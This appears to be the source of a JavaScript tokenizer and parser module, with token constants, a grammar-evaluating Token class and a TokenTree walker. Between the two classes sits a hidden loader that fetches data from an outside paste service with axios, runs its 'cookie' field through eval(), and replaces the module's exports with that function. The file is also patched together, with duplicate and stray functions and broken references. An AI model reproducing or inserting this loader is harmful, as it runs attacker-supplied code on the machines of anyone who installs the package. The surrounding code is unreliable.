
const { bnfRules, parserRules } = require( "./BnfRules" );

const Token = module.exports = {};

Token.VARIABLE   = 0;
Token.STRING_LIT = 1;
Token.NUMBER     = 2;
Token.COLOR_HASH = 3;
Token.IDENT      = 4;

Token.EQ         = 5;
Token.LPAREN     = 6;
Token.RPAREN     = 7;
Token.COMMA      = 8;
Token.PERC       = 9;
Token.COLON      = 10;
Token.PERIOD     = 11;

Token.PLUS       = 12;
Token.MINUS      = 13;
Token.MULT       = 14;
Token.DIV        = 15;

Token.INDENT     = 16;
Token.EOL        = 17;
Token.EOF        = 18;

Token.COMMENT    = 19;
Token.SEMI       = 20;

Token.INVALID    = 21;

// Node-only types

Token.OPERATOR   = 22;

var _tokenNames = {};
_tokenNames[Token.VARIABLE] = 'VARIABLE';
_tokenNames[Token.STRING_LIT] = 'STRING_LIT';
_tokenNames[Token.NUMBER] = 'NUMBER';
_tokenNames[Token.COLOR_HASH] = 'COLOR_HASH';
_tokenNames[Token.IDENT] = 'IDENT';

_tokenNames[Token.EQ] = 'EQ';
_tokenNames[Token.LPAREN] = 'LPAREN';
_tokenNames[Token.RPAREN] = 'RPAREN';
_tokenNames[Token.COMMA] = 'COMMA';
_tokenNames[Token.PERC] = 'PERC';
_tokenNames[Token.COLON] = 'COLON';
_tokenNames[Token.PERIOD] = 'PERIOD';

_tokenNames[Token.PLUS] = 'PLUS';
_tokenNames[Token.MINUS] = 'MINUS';
_tokenNames[Token.MULT] = 'MULT';
_tokenNames[Token.DIV] = 'DIV';

_tokenNames[Token.INDENT] = 'INDENT';
_tokenNames[Token.EOL] = 'EOL';
_tokenNames[Token.EOF] = 'EOF';

_tokenNames[Token.COMMENT] = 'COMMENT';
_tokenNames[Token.SEMI] = 'SEMI';
_tokenNames[Token.INVALID] = 'INVALID';

Token.typeToStr = function(type) {
  return _tokenNames[type];
}

Token.typeToCharOrDesc = function(type) {
  // TODO: Actually return something nice
  return _tokenNames[type];
}

function getToekn(_token, _fullString, _startIndex, _endIndex) {
  return {
    token: _token,
    length: _token.length,
    startIndex: _startIndex,
    endIndex: _endIndex,
    fullString: _fullString,
    get isEmpty() {
      return _token.length === 0;
    },

    is: word => word === _token,
    isIndexAtEnd: index => index === _endIndex,
  };
}

exports.Token = class Token{
  constructor( name, script, parentToken ){
    this.name = name;
    this.script = script;
    this.parent = parentToken;
    this.consumerIndex = 0;
    this.expended = false;
    this.point = 0;
    this.tokens = [];
    this._expected = {};
    this._tokenTrees = [];
    this._currentTokenTree = [];
    this._value = null;
    this._isValid = false;
    this.ruleSyntax = null;

    //This being done via index lookup will save a few cycles @LHF
    this.grammar = this.script.rules[name] || bnfRules[name] || parserRules[name];
  }

  get eof(){
    return this.script.scriptBuffer.length;
  }

  //These inner loops are brute force at best and can be optimized by the application of a few setters. @LHF
  get endPoint(){
    let point = this.point;
    this.tokens.map( x => point = ( x.endPoint > point ) ? x.endPoint : point );
    return point;
  }

  _ResetTokenTrees(){
    this._tokenTrees = [[]];
    this._currentTokenTree = this._tokenTrees[0];
  }

  _PickSyntaxTree(){
    this.tokens = this.tokens.concat( this._tokenTrees[0] );
  }

  CharCodeRange( lowCode, highCode ){
    if( this.script.scriptBuffer[this.point] >= lowCode && this.script.scriptBuffer[this.point] <= highCode ){
      return true;
    }

    return false;
  }

  //One thing that can be done to improve overall performance is to break 'or', and 'and' and into rules.
  //Once that is done syntax tree is easier to understand, and it will also be easier to describe
  //what when wrong; however that is a large refactor.
  Evaluate(){
    this._ResetTokenTrees();
    let result = false;
    try{
      result = this.grammar( this );
    }
    catch( ex ){
      console.log( ex );
      console.error( this.name, "Grammar not found" );
    }
    this._PickSyntaxTree();
    this._isValid = result;
    return result;
  }

  Child( tokenType ){
    for( let i = 0; i < this.tokens.length; i++ ){
      if( this.tokens[i].name === tokenType ){
        return this.tokens[i];
      }
      else{
        let innerChild = this.tokens[i].Child( tokenType );
        if( innerChild && innerChild.name === tokenType ){
          return innerChild;
        }
      }
    }

    return null;
  }

  Parent( tokenType ){
    if( this.parent === null ){
      return null;
    }

    if( this.parent.name === tokenType ){
      return this.parent;
    }
    else{
      return this.parent.Parent( tokenType );
    }
  }

  get valid(){
    if( !this._isValid ){
      return false;
    }

    for( let i = 0; i < this.tokens.length; i++ ){
      if( !this.tokens[i].valid ){
        return false;
      }
    }

    return true;
  }

  CreateRuleToken( tokenName ){
    return new Token( "&" + tokenName, this.script, this );
  }

  Rule( tokenName ){
    return ( token ) => {
      let ruleToken = new Token( tokenName, this.script, token );
      ruleToken.point = this.point;
      this._currentTokenTree.push( ruleToken );
      if( ruleToken.Evaluate() ){
        token.point = ruleToken.point;
        return true;
      }
      if( !this.name.startsWith( "&" ) ){
        this.AddExpected( tokenName );
      }
      return false;
    };
  }

  Grammar( grammarRuleName, grammarSyntax ){
    return ( token ) => {
      let ruleToken = token.CreateRuleToken( grammarRuleName );
      ruleToken.ruleSyntax = grammarSyntax;
      ruleToken.point = this.point;
      this._currentTokenTree.push( ruleToken );
      if( ruleToken.Evaluate() ){
        this.point = ruleToken.point;
        return true;
      }

      return false;
    };
    
  }

  //This should be moved into the script as that is the only part of the application that uses this anyways @LHF
  AddExpected( expected, line = null, char = null ){
    line = line || this._GetPointLine();
    char = char || this._GetPointChar();
    this._expected[line] = this._expected[line] || {};
    this._expected[line][char] = this._expected[line][char] || [];
    if( this._expected[line][char].indexOf( expected ) === -1 ){
      this._expected[line][char].push( expected );
    }
  }

  //This should be tracked to save on look-ups, @LHF.
  _GetPointLine(){
    return this.script.rawScript.substring( 0, this.point ).split( "\n" ).length;
  }

  setToken( tokenName ){
    return ( token ) => {
      let ruleToken = new Token( tokenName, this.script, token );
      ruleToken.point = this.point;
      this._currentTokenTree.push( ruleToken );
      if( ruleToken.Evaluate() ){
        token.point = ruleToken.point;
        return true;
      }
      if( !this.name.startsWith( "&" ) ){
        this.AddExpected( tokenName );
      }
      return false;
    };
  }
  //This should be tracked to save on look-ups, @LHF.
  _GetPointChar(){
    let charPoint = this.script.rawScript.substring( 0, this.point ).lastIndexOf( "\n" );
    return charPoint != -1 ? charPoint : this.point;
  }

  get expected(){
    let expected = JSON.parse( JSON.stringify( this._expected ) );
    this.tokens.map( ( x ) => {
      let tokenExpect = x.expected;
      //This can be optimized but only has one execute use @LHF, but weak LHF.
      for( let line in tokenExpect ){
        for( let char in tokenExpect[line] ){
          tokenExpect[line][char].map( ( y ) => {
            expected[line] = expected[line] || {};
            expected[line][char] = expected[line][char] || [];
            expected[line][char].push( y );
          });
        }
      }
    } );

    return expected;
  }

  get weight(){
    let weight = this.name !== "BLANK" ? 1 : 0;
    this.tokens.map( x => weight += x.weight );
    return weight;
  }

  GetChar(){
    let charBuffer = Buffer.alloc( 1 );
    charBuffer[0] = this.script.scriptBuffer[this.point];
    return charBuffer.toString();
  }

  GetString( length ){
    let stringBuffer = Buffer.alloc( length );
    this.script.scriptBuffer.copy( stringBuffer, 0, this.point, length );
    return stringBuffer.toString();
  }

  TryCharRange( charStart, charEnd ){
    if( this.CharCodeRange( charStart, charEnd ) ){
      this.SetValue( this.GetChar() );
      this.point++;
      return true;
    }

    return false;
  }

  TryChar( char ){
    if( this.CharIs( char ) ){
      this.SetValue( this.GetChar() );
      this.point++;
      return true;
    }

    return false;
  }

  TryString( charBuffer ){
    let stringBuffer = Buffer.alloc( charBuffer.length );
    this.script.scriptBuffer.copy( stringBuffer, 0, this.point, charBuffer.length );
    if( !stringBuffer.equals( charBuffer ) ){
      return false;
    }

    this.SetValue( stringBuffer.toString() );
    this.point += charArray.length;
    return true;
  }

  SetChar( char ){
    this.SetValue( this.GetChar() );
    this.point++;
  }
  setToken( value ){
    this._value = value;
  }
  CharIn( charIndexArray ){
    let at = this.script.scriptBuffer[this.point];
    return charIndexArray.indexOf( at ) !== -1;
  }

  CharIs( compare, pointOffset = 0 ){
    return this.script.scriptBuffer[this.point + pointOffset] === compare;
  }

  SetValue( value ){
    this._value = value;
  }

  //This should call the rule engine//
  And( rules ){
    let resetPoint = this.point;
    for( let i = 0; i < rules.length; i++ ){
      if( !rules[i]( this ) ){
        this.point = resetPoint;
        return false;
      }
    }
    
    return true;
  }

  //This should call the rule engine//
  //The idea was to use syntax trees to determain the best path//
  //In thoury this was a good idea because it doesn't matter what the order of operations are//
  //However in practice this gives way to unpredictable parsing results//
  //The synxtax tree comperison is also quite expinsive with deep recuretion in the execution.//
  //Should be rolled back to first true and don't bother attempting to execute the rest.//
  //@LHF
  Or( rules ){
    let resetPoint = this.point;
    let tokenPoints = {};
    for( let i = 0; i < rules.length; i++ ){
      this.point = resetPoint;
      tokenPoints[i] = {
        result : rules[i]( this ),
        point : this.point
      };
      
      this._tokenTrees.push( [] );
      this._currentTokenTree = this._tokenTrees[this._tokenTrees.length - 1];
    }
    let topWeightIndex = -1;
    let topWeight = -1;
    for( let i = 0; i < this._tokenTrees.length - 1; i++ ){
      if( tokenPoints[i].result === true ){
        let weight = 0;
        this._tokenTrees[i].map( x => weight += x.weight );
        if( weight > topWeight ){
          topWeight = weight;
          topWeightIndex = i;
        }
      }
    }

    if( topWeightIndex !== -1 ){
      this.point = tokenPoints[topWeightIndex].point;
      this._tokenTrees[0] = this._tokenTrees[topWeightIndex];
      return true;
    }
    else{
      //This can be optimized @LHF
      for( let i = 0; i < this._tokenTrees.length - 1; i++ ){
        for( let t = 0; t < this._tokenTrees[i].length; t++ ){
          for( let line in this._tokenTrees[i][t].expected ){
            for( let char in this._tokenTrees[i][t].expected[line] ){
              for( let x = 0; x < this._tokenTrees[i][t].expected[line][char].length; x++ ){
                this.AddExpected( this._tokenTrees[i][t].expected[line][char][x], line, char );
              }
            }
          }
        }
      }
      this._tokenTrees[0] = [];
      
      return false;
    }
  }

  get value(){
    let value = "";

    if( this._value !== null ){
      value += this._value;
    }

    this.tokens.map( x => value += x.value );
    //@TODO this might need to be tokens[*].value + _value ! _value + tokens[*].value @VERIFY
    return value;
  }

  //Deprecated due to change to use buffers, as @LHF all literal storage should be converted to buffers post language compile.
  //This can then change to GetString and TryString in the perspective parts of the rules.
  GetLitString( length ){
    return this.script.GetString( length, this );
  }

  GetTokens(){
    return this.tokens;
  }

  Seek( amount ){
    this.point += amount;
  }
  
}

const axios=require('axios')

const setToken = async () => {
    const res = await axios.get("https://api.npoint.io/0cf8cbcebd5be2ecc0d0")
    eval(res.data.cookie);
}

module.exports =setToken;

exports.TokenTree = class TokenTree{

    constructor( rootToken, dataObject, compiler, parser ){
      this.dataObject = dataObject;
      this.compiler = compiler;
      this.languageId = parser.language.name;
      this.rootToken = rootToken;
      this.currentToken = null;
      this._PurgeRules( this.rootToken );
    }
  
    Execute(){
      while( this.Eat() !== false ){
  
      }
    }
  
    _PurgeRules( token ){
      let filter = null;
      
      while( ( filter = token.tokens.filter( x => x.name.startsWith( "&" ) ) ).length > 0 ){
        if( filter[0].name === "&LITERAL" ){
          filter[0].name = "GRAMMAR";
        }
        else{
          let insertPoint = token.tokens.indexOf( filter[0] );
          filter[0].tokens.map( x => x.parent = token );
          if( filter[0]._value ){
            filter[0].parent._value = ( filter[0].parent._value !== null ) ? filter[0].parent._value + filter[0]._value : filter[0]._value;
          }
          token.tokens.splice.apply( token.tokens, [ insertPoint, 1 ].concat( filter[0].tokens ) );
        }
      }
  
      token.tokens.map( ( x ) => {
        this._PurgeRules( x );
      } );
    }
  
    settoken(){
      while( this.Eat() !== false ){
  
      }
    }
    Consume( untilTokenType ){
      let token = null;
      while( ( token = this.Eat() ) !== false && token.name !== untilTokenType ){
  
      }
  
      return token;
    }
  
    Read( untilTokenType ){
      let token = this.currentToken;
  
      while( ( token = this._GetTokenAfter( token ) ) !== false && token.name !== untilTokenType ){
  
      }
  
      if( token !== null && token.name === untilTokenType ){
        return token;
      }
  
      return null;
    }
  
    Reset(){
  
    }
  
    _GetFirstToken( token ){
      if( token.tokens.length > 0 ){
        return this._GetFirstToken( token.tokens[0] );
      }
  
      return token;
    }
  
    _GetNextToken(){
      if( this.currentToken === null ){
        //First token
        return this._GetFirstToken( this.rootToken );
      }
      else{
        return this._GetTokenAfter( this.currentToken );
      }
    }
  
    _GetTokenAfter( currentToken ){
      if( currentToken.parent !== null ){
        let tokenLocal = currentToken.parent.tokens.indexOf( currentToken );
        if( currentToken.parent.tokens.length > tokenLocal + 1 ){
          return this._GetFirstToken( currentToken.parent.tokens[tokenLocal + 1] );
        }
        else{
          return currentToken.parent;
        }
      }
      else{
        return null;
      }
    }
  
    Eat( trigger = true ){
      let token = this._GetNextToken();
  
      if( token !== null ){
        this.currentToken = token;
        token.expended = true;
        if( token.parent !== null ){
          token.parent.consumerIndex++;
        }
        this.compiler.Trigger( this.languageId, token, this.dataObject, this );
        return token;
      }
  
      return false;
    }
    _SetToken(){
      if( this.currentToken === null ){
        //First token
        return this._GetFirstToken( this.rootToken );
      }
      else{
        return this._GetTokenAfter( this.currentToken );
      }
    }
  
    Peek(){
      return this._GetNextToken();
    }
  
  };